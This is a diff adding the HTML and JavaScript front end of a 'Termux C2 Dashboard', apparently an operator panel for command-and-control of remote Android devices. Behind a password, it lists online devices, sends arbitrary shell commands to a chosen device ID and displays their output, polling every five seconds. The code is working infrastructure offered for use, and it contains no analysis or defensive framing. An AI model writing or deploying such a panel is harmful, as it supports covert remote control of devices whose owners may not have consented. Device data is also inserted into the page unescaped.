@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: monospace; background: #121212; color: #00ff00; padding: 20px; }
+        .box { border: 1px solid #333; padding: 15px; margin-bottom: 15px; background: #1e1e1e; border-radius: 5px; }
+        input, button { background: #333; color: #fff; border: 1px solid #555; padding: 8px; margin: 3px; border-radius: 3px; }
+        button { cursor: pointer; background: #005a00; border-color: #008000; }
+        button:hover { background: #008000; }
+        .dev { color: #00ffff; font-weight: bold; margin: 5px 0; }
+        pre { white-space: pre-wrap; word-wrap: break-word; }
+    </style>
+</head>
+<body>
+    <h2>Termux C2 Dashboard</h2>
+    <div id="login" class="box">
+        <input type="password" id="pass" placeholder="Enter Dashboard Password">
+        <button onclick="login()">Login</button>
+    </div>
+    <div id="main" style="display:none;">
+        <div class="box">
+            <h3>Online Devices</h3>
+            <div id="devices">Loading...</div>
+        </div>
+        <div class="box">
+            <h3>Send Command</h3>
+            <input type="text" id="target_dev" placeholder="Device ID (e.g. P-xxxx)" style="width:120px;">
+            <input type="text" id="cmd" placeholder="Command" style="width:50%;">
+            <button onclick="sendCmd()">Send</button>
+        </div>
+        <div class="box">
+            <h3>Output Log</h3>
+            <pre id="outputs"></pre>
+        </div>
+    </div>
+    <script>
+        let token = "";
+        async function login() {
+            token = document.getElementById('pass').value;
+            const res = await fetch('/api/dashboard', { headers: { 'Authorization': token } });
+            if (res.status === 401) { alert('Wrong password'); return; }
+            document.getElementById('login').style.display = 'none';
+            document.getElementById('main').style.display = 'block';
+            refresh();
+            setInterval(refresh, 5000);
+        }
+        async function refresh() {
+            const res = await fetch('/api/dashboard', { headers: { 'Authorization': token } });
+            if (res.status === 401) return;
+            const data = await res.json();
+            let devHtml = "";
+            data.devices.forEach(d => {
+                devHtml += `<div class="dev">🟢 ${d.id} — ${d.model} (Last seen: ${d.last_seen})</div>`;
+            });
+            document.getElementById('devices').innerHTML = devHtml || "No devices online.";
+            let outHtml = "";
+            data.outputs.forEach(o => {
+                outHtml += `<span class="dev">[${o.dev}]</span> ${o.text}\n`;
+            });
+            document.getElementById('outputs').innerText = outHtml;
+        }
+        async function sendCmd() {
+            const dev = document.getElementById('target_dev').value.trim();
+            const cmd = document.getElementById('cmd').value.trim();
+            if (!dev || !cmd) return;
+            await fetch('/api/dashboard', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Authorization': token },
+                body: JSON.stringify({ device_id: dev, command: cmd })
+            });
+            document.getElementById('cmd').value = "";
+        }
+    </script>
+</body>
+</html>
